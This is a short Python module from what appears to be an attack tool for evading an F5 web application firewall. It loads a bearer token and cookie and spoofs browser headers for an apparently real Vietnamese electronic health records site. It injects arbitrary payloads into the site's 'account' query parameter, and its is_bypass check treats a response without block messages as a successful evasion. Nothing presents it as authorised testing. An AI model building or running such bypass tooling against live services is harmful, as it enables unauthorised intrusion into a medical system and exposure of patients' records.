import sys
from pathlib import Path
from urllib.parse import quote

_ML_WAF = Path(__file__).resolve().parent.parent / "ml-waf"
if _ML_WAF.is_dir() and str(_ML_WAF) not in sys.path:
    sys.path.insert(0, str(_ML_WAF))

from evasion.curl_bypass_f5 import BASE_URL, BEARER, COOKIE

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Authorization": f"Bearer {BEARER}",
    "Origin": "https://ybadientu.hososuckhoe.vn",
    "Referer": "https://ybadientu.hososuckhoe.vn/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
}
if COOKIE:
    HEADERS["Cookie"] = COOKIE


def build_url(payload: str) -> str:
    q = quote(payload, safe="") if not payload.startswith("36331%") else payload
    return f"{BASE_URL}?account={q}"


def is_bypass(resp) -> bool:
    if resp.status_code != 200:
        return False
    text = (resp.text or "").lower()
    reject_phrases = [
        "request rejected", "access forbidden", "request blocked",
        "request has been blocked", "blocked by", "access denied",
    ]
    for p in reject_phrases:
        if p in text:
            return False
    if '"blocked":true' in text or '"rejected":true' in text:
        return False
    return True
